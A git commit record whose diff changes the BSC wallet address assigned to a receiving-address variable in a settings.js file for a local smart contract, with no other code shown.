3667df2fd52174ee65c9142b00b95014a3685659
yahooplus1 <vantasticvp@gmail.com>
2024-10-12 20:20:08 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xA20405464b05B7B77E4ADA948bae34a092a9B417";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
